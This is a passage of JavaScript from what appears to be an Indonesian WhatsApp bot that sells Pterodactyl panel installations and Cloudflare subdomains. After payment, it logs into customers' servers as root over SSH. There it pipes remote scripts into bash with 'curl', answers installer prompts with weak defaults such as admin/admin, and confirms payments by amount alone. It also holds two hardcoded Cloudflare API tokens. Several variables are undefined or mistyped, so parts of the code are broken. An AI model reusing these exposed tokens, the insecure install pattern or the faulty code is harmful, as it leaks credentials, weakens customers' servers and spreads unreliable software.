 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: pantek})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await Reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break
//------(Batas Case)------//
case "installbuyyer2": {
 if (m.isGroup) return Reply("jasa install panel hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 6000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: pantek})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('New York\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await Reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break
//------(Batas Case)------//
case "jasainstallpanel":
{
 if (!text || !text.split("|")) return Reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 let vii = text.split("|");
 if (vii.length < 2) return Reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 
 global.installpanell = {
 vps: vii[0], 
 pwvps: vii[1],
 domain: vii[2],
 nodedomain: [3],
 rampanel: [4]
 };

 let jasa = `
 *_Silahkan Pilih Region (Lokasi)_*
 `;

 let buttons = [
 { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
 { buttonId: ".infobot", buttonText: { displayText: "ɪɴғᴏ ʙᴏᴛ" } }
 ];

 let buttonMessage = {
 video: {
         url: global.video 
       },
 caption: `${jasa}`,
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: `Tama OfficiaL`
 }
 },
 footer: `${footer}`,
 buttons: buttons,
 viewOnce: true,
 headerType: 6
 };

 const flowActions = [
 {
 buttonId: 'action',
 buttonText: { displayText: 'This Button List' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "silahkan pilih region",
 sections: [
 {
 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ",
 highlight_label: "rekomendasi",
 rows: [
 { title: "Region Singapore", description: "RP 5.000", id: ".installbuyyer1" },
 { title: "Region NewYork", description: "RP 6.000", id: ".installbuyyer2" }
 ]
 }
 ]
 })
 },
 viewOnce: true
 }
 ];

 buttonMessage.buttons.push(...flowActions);

 await TamaMods.sendMessage(m.chat, buttonMessage, { quoted: pantek }); // Use `m` here instead of `fkontak`
 };

break;

case "buydomain":
{
 if (!text || !text.split("|")) return Reply(example("hostname|ipvps"));
 let vii = text.split("|");
 
 let hostname = vii[0].trim(); 
 let ip = vii[1].trim(); 

 let jasa = `
 *_Silahkan Pilih Domain_*
 `;

 let buttons = [
 { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
 { buttonId: ".infobot", buttonText: { displayText: "ɪɴғᴏ ʙᴏᴛ" } }
 ];

 let buttonMessage = {
 video: {
         url: global.video 
       },
 caption: `${jasa}`,
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: `Tama OfficiaL`
 }
 },
 footer: `${footer}`,
 buttons: buttons,
 viewOnce: true,
 headerType: 6
 };

 const flowActions = [
 {
 buttonId: 'action',
 buttonText: { displayText: 'This Button List' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "Pilih Domain",
 sections: [
 {
 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ",
 highlight_label: "rekomendasi",
 rows: [
 { title: "fr3serv.my.id", description: "ᴀᴋᴛɪғ", id: `.domain1 ${hostname}|${ip}` },
 { title: "tokopanel.software", description: "ɴᴏɴᴀᴋᴛɪғ", id: `.domain2 ${hostname}|${ip}` }
 ]
 }
 ]
 })
 },
 viewOnce: true
 }
 ];

 buttonMessage.buttons.push(...flowActions);

 await TamaMods.sendMessage(m.chat, buttonMessage, { quoted: pantek }); // Use `m` here instead of `fkontak`
 };

break;

case "domain1":
{
 if (m.isGroup) return Reply("pembelian domain hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "65a88f5deee3629dcf7ca40493a06f22";
 let apitoken = "vP0oD4FGJBpHvDKZGZFIq0Cb2fRcGV5RppLcvug5";
 let tld = "fr3serv.my.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return Reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 2500;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${harga}&codeqr=${global.QrisOrderKuota}`);

 const teks3 = `
* INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;
 let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Buy Domain`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await TamaMods.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}  
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 Reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 Reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await TamaMods.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case "domain2":
{
 if (m.isGroup) return Reply("pembelian domain hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "cc9638d4c289130ba070484625e6aefa";
 let apitoken = "bcAP5z3gHvmQTlQ59qNB9BWmf0JiGt0C99FU6SXs";
 let tld = "tokopanel.software";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return Reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 2500;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${harga}&codeqr=${global.QrisOrderKuota}`);

 const teks3 = `
* INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Buy Domain`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await TamaMods.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 Reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 Reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await TamaMods.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case "buyownpanel": {
    if (m.isGroup) return Reply("🔒 Pembelian Owner Panel Pterodactyl hanya bisa di dalam private chat!");
    if (db.users[m.sender].status_deposit) return Reply("❗ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return Reply(example("username"));
    if (text.includes(" ")) return Reply("❌ Username tidak boleh memakai spasi!");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "20000"; 
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 70);
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    
    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* Owmer Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Own Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data;
